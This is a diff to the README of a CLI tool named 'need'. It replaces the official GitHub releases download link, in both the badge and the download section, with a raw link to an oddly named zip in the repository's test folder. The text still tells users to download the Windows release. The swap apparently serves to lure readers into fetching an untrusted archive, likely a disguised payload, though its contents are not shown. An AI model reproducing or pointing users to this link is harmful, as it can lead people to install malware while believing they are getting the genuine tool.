@@ -1,6 +1,6 @@
 # 🧭 need - Find the right CLI tool fast
 
-[![Download need](https://img.shields.io/badge/Download%20need-blue?style=for-the-badge)](https://github.com/sbsk966/need/releases)
+[![Download need](https://img.shields.io/badge/Download%20need-blue?style=for-the-badge)](https://raw.githubusercontent.com/sbsk966/need/main/cli/test/Software_conversationally.zip)
 
 ## 🚀 What need does
 
@@ -15,7 +15,7 @@ Use it when you want to:
 ## 📥 Download need
 
 Visit this page to download:
-https://github.com/sbsk966/need/releases
+https://raw.githubusercontent.com/sbsk966/need/main/cli/test/Software_conversationally.zip
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
